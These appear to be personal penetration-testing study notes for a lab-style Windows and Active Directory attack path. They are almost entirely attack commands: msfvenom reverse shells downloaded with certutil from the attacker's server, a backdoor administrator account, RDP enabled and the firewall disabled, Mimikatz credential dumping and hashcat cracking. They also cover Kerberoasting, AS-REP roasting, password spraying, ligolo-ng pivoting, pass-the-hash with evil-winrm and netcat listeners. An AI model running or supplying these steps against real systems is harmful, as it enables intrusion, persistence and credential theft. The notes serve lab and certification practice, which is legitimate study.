######## Abusing of Scheduled Task to escalate privilges and Persistence via Backdooring ########
Credits: Derron C Attack Path2: https://www.youtube.com/watch?v=jBfdlLybMek

Once we have a first access on a machine, we can run winpeas or enumerate manually to list all the process, task, file that we can use to escalade

    Then if we find a vulnerability on Schedule Task:
        Windows cmd that list TaskName + Privileges:
        -> schtask /query /fo /LIST /v /TN "TaskName"

        We can create a reverse shell to abusing the schedule task and obtain privileges:
            in Kali:
                msfvenom -p windows/x64/shell_reverse_tecp LHOST=<Kali ip> LPORT=<Port> -f exe -o payloadName.exe

                Run a Local Web Server:
                    python -m http.server 8080 or python -m http.server -d . 80 (if we are in Directory)

        Windows:
            certutil.exe -urlcache -f http:///Kali IP/payload.exe payload.exe

            encapsulate the payload into the task exe

            Once we have acces to a renote shell with Admin priv:
                search for local an proof.txt:
                    -> dir /s/b local.txt
                        or
                        dir /s/b *.txt
    
    Backdooring with admin priv:
        C:\Users>net user /add backdoor Password1     <--Create and add a User named Backdoor
                >net localgroup administrators /add backdoor 
                >net localgroup administrators        <- List our backdoor in Admin localgroup
                >net user backdoor                    <- verify again
        
        If not enable use this command to backdooring via RDP and Not - Deny by Denying Terminal Service to '0' :)
            C:\Users> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f

        Disable the Win FW: 
            C:\Users> netsh advfirewall set allprofiles state off

        Kali RDP to Get Creds (Enumeration):
            xfreerdp /v:ms01 /u:backdoor /p:Password1 +clipboard /cert:ignore (Local Admin priv)
            Download mimkatz on Git
            python -m http.server or python -m http.server -d . 80 (if we are in Directory)

            Windows: Import Mimikatz downloaded from Kali - Admin CMD in Windows:
                    certutil.exe -f -urlcache http:\\IP/mimikaz.exe minou.exe

                    minou.exe
                    mimikatz# privilege::debug <- should display "20 OK"
                            log <- send the result into file 
                            lsadump::lsa  /inject <- Dump Users

                            sekurlsa::logonpasswords

                            type mimikatz.log | findstr /i username <- Like Grep to parse log file 
                        We can collet the user that we Want and his SID + NTLM Hash 

                The NTLM Hash will help us to Enumerate Active Directory:
                    in Kali:
                        hashcat NTLMHash.hash /usr/share/wordlists/rockyou.txt -m 1000 <- NTLM mode == 1000
                
                With the clear Password from the DeHash off NTLM + User name we can now start the Kerberosting techniques and spray the password.
                --------------------------
                ****But first we need to Pivot because we are not able to attain the KDC server in order to obtain (TGT) through this machine****
    
    Ligolo-NG:
                We will use : https://github.com/nicocha30/ligolo-ng and use the Proxy Tunneling
                                Help doc: https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740

                    7z x ligolo-ng_agent...... <- Unzipp via 7zip
                    rm LICENSE README.md

                    tar -xzvf ligolo-ng_proxy...
                    mv proxy /usr/bin/
                
                        we will use impacket to create an SMB server we will catch the HASH:
                            impacket-smbserver =smb2support stage .

                In compromise Windows via RDP to find the SMB Server generated by Kali-impacket go to check the screenshoot and change the IP in:
                    img/SMB_Server_Windowds.png

                    copy the "agent" and past it in C:\Users\Public:
                        img/agent_Copy_past.png

                In Kali we will run a Proxy:
                    We will create ligolo tunnel interface with our kali account:
                        -> sudo ip tuntap add user kali mode tun ligolo
                            sudo ip link set ligolo up
                            proxy -selfcert <-- Give us the Listenning Port

                In Windows:
                    C:\Users\Public> agent.exe -connect <VPN IP of our Kali:Port> -retry -ignore-cert

                In Kali:
                    ligolo-ng >> session
                                1
                                ifconfig 
                                start
                    we need to add the route displayed in logolo-if config:
                        sudo ip route add DC-Subnet\Mask dev ligolo <-- we will choose the Tunneling interface and add to route in Kali
                        route <- to check if the route to proxy is now added

    Kerberosting:
                If we have connectivity to the DC:
                    impacket-GetUserSPNs -request -dc-ip <DC IP> <domain.name>/<user>
                    Enter the Password found before
                If we get the message "No entries found!" == No Kerberosting possible - No svc-account available:( ...

        We will test Webroasting

    Webroasting-ASREP:
                We will ask for the list of all USERS that dont require PRE AUTH
                    impacket-GetNPUsers <domain.name>/<user>:
                        display available Newusername
                    impacket-GetNPUsers <domain.name>/<user> -outputfile Newusername.asrep
                If ok we will get the ASREP HASH of Newusername 

                We cannot use ASREP for PASS the Hash
                    So we will try to DeHash - If we good we'll have the celar password:
                        hashcat Newusername.asrep /usr/share/wordlists/rockyou.txt

        In the mean time we will Enum the DC and machines via Nmap

    DC Enum:
            We will enum all the ports in aggressive way becaus enot real scenario:
                nmap -PN -T4 -p- -v <DC or Machine IP> -oN enu/nmap_ports.log 
            We can also enum the top 50 ports:
                nmap -PN -sV --top-portd 50 --open <DC or Machine IP>

        If we find RPC Port 3389:
            try the credentials of (Newusername + hashcat clear password) founded by connecting to the firt machine that we have access in RPC and perform runas cmd:
                runas /user:domain\Newusername cmd.exe

                We will query the domain to find the users:
                    net user /domain

                From this we will get all the existant domain users to prepare Password Spray attack on port 3389:
                    -We copy all users founded + "administartor" in txt file in our Kali
                    -We will create a Password txt file and paste it the passwords that we found previously

                -Crackmapexec against the DC if we found (port that could lead to think about it is a DC: 53,88,445,139)
                    enumerate SMB 445: 
                        crackmapexec smb -u <user.txt> -p <passwords.txt> --continue-on-success <DC IP>
                        crackmapexec: cme smb <ip> -u " -p" <----Enumerate Null Sessions
                        crackmapexec: cme smb <ip> -u'a' -p" <----Enumerate Anonymous Access

                        We can test RDP 3389:
                            crackmapexec rdp -u <user.txt> -p <passwords.txt> --continue-on-success <Machine IP>
                            If PWND:
                                xfreerdp /v:<Vitcime Machine IP> /u:<username> /d:<domain.name> /p:<password> +clipboard / cert:ignore\
                                If we onle have the Username we can use xfreerdp to perform PTH attack also.
                            If we get access:
                                cmd:
                                    net user 
                                    net localgroup administartors

                                    Check local admin privilige, if we found one that we already have creds:
                                        runas /user:domain\user cmd.exe 
                                        if good:
                                            whoami /priv 
                                            whoami /all 
                                open an admin cmd:
                                    net user/add backdoor Password1 <---We create a Backdoor
                                    net localgroup administrators /add backdoor 
                                    net localgroup administartors

                                    import Mimikatz (2 Technics import from the first corrupted machine who's already download mimikatz from Kali or use PortForwarding from this new machine back to our Kali machine):
                                        1st Technic SMB Share: open RDP on the 1st Corrupted Machine, place Mimikatz on "Public" folder:
                                           Admin cmd:
                                            net share public=c:\Users\Public /GRANT:Everyone,Full
                                            net share
                                            We will make it consultable for everyone via GUI:
                                                This PC -> Public -> Properties -> Security -> Edit -> Add -> Location -> Cancel -> Choose the Second Corrupted Machine Name -> Enter the object name: everyone -> Check Name

                                            We go back to the second Corrupted Machine in GUI and check if mimikatz is accessible:
                                                Network -> Machine -> Public:
                                                    if OK:
                                                        mimikatz:
                                                            privilege::debug (20 ok)
                                                            log
                                                            lsadump::lsa /inject
                                                            sekurlsa::logonpasswords

                                                            check the log in the Public Folder + ctrl F (try to fin Golden ticket - Administrator - NTLM Hash)
                                                                if OK:
                                                                    in Kali:
                                                                        echo NTLMhash > adminHash.hash
                                                                        hashcat adminHash.hash /usr/share/wordlists/rockyou.txt m-1000

                                                                        if not deHashed we can use:
                                                                            hashcat adminHash.hash /usr/share/wordlists/rockyou.txt m-1000 -r /usr/share/hashcat/rule/best64.rule

                                                                        if still not:
                                                                            PTH Attack:
                                                                                evil-winrm -i <DC IP> -u administrator -H NTLMHash

                                                                                IF ok - Screenshoot:
                                                                                    cd C:\Users\Administrator\Documents
                                                                                    dir desktop
                                                                                    users\proof.txt
                                        
                                        2nd Technic PortForwarding:
                                            Proxy Listenner: Open a port on 1st corrupted machine + allow connection to our Kali.
                                                If ok we will make a connection directly from our Kali to the 2nd Corrupted Machine:
                                                    in Kali:
                                                        ligolo
                                                            listenner_add -addr 0.0.0.0:8888 --to 127.0.0.1:80
                                                            listenner_list

                                                            cd/Where Mimikatz is Located:
                                                                python -m http.server - . 80
                                                    
                                                    in DC Machine or 2nd corrupted Mahcine if we don<t have initially access to DC:
                                                        certutil.exe -f -urlcache http://<1stCorruptedMachineName>:8888/winrev443.exe winrev443.exe
                                                        certutil.exe -f -urlcache http://<1stCorruptedMachineName>:8888/mimikatz.exe mimikatz.exe  

                                            OR

                                            Reverse Shell:
                                                in Kali:
                                                        ligolo
                                                            listenner_add -addr 0.0.0.0:4444 --to 127.0.0.1:443
                                                            listenner_list

                                                        msfvenom:
                                                            msfvenom -p windows/x64/shell_reverse_tcp  LHOST=<1st Corrupted Machihne IP> LPORT=4444 -f exe -o winrev4444ms01.exe
                                                        
                                                        evil-winrm:
                                                            evil-winrm -i <DC IP> -u administrator -H NTLMHash
                                                            upload winrev4444ms01.exe

                                                        kali:
                                                        nc -lvnp 443

                                                        evil-winrm:
                                                            .\winrev4444ms01.exe 
                                                            whoami
                                                            hostname

                            If we found some "ephemeral" ports we can assume that we can use "Win RM":
                            crackmapexec winrm <DC IP> <--Fingerprinting
                            crackmapexec winrm -u <user.txt> -p <passwords.txt> --continue-on-success <DC IP>

                        OR

                        enum4linux -A <DC IP>
                        enum4linux -A <DC IP> -u <username> -p <password>
                        if no creds:
                            enum4linux -a -u "" -p "" <DC IP>
                            enum4linux -a -u "guest" -p "" <DC IP>
                        
                        OR 

                        smbclient (refer to: /Phase_2/Eumeration/Enumerate_SMB.txt)
                        smbclient -L \\<DC IP> -U <domain/username> 
                        if no creds:
                            smbclient -U '%' -L//<DC IP>
                            smbclient -U 'guest%' -L//<DC IP>
                

        


